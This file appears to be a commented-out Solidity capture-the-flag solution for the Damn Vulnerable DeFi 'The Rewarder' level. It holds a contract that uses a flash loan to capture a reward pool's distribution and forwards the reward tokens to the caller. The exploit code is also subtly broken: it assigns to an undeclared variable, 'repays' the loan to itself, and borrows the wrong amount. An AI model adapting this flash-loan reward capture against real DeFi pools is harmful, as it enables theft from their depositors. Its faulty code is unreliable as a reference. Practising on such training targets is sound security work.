// // SPDX-License-Identifier: MIT
// pragma solidity ^0.8.0;

// // solution for v2

// import './RewardToken.sol';
// import './FlashLoanerPool.sol';
// import './TheRewarderPool.sol';
// import '../DamnValuableToken.sol';

// contract HackReward {
//     FlashLoanerPool public flashPool;
//     TheRewarderPool public rewardPool;
//     DamnValuableToken public token;
//     RewardToken public reward;

//     constructor(address _pool, address _token, address _rewardPool, address _reward) {
//         pool = FlashLoanerPool(_pool);
//         token = DamnValuableToken(_token);
//         rewardPool = TheRewarderPool(_rewardPool);
//         reward = RewardToken(_reward);
//     }

//     fallback() external {
//         uint bal = token.balanceOf(address(this));

//         token.approve(address(rewardPool), bal);
//         rewardPool.deposit(bal); // deposit and calls distributeRewards().
//         rewardPool.withdraw(bal);

//         token.transfer(address(this), bal); // after benefeting funds from flashLoan pool to collect rewards, transfer(pay) back it.
//     }

//     function attack() external {
//         flashPool.flashLoan(token.balanceOf(address(this)));
//         reward.transfer(msg.sender, reward.balanceOf(address(this)));
//     }
// }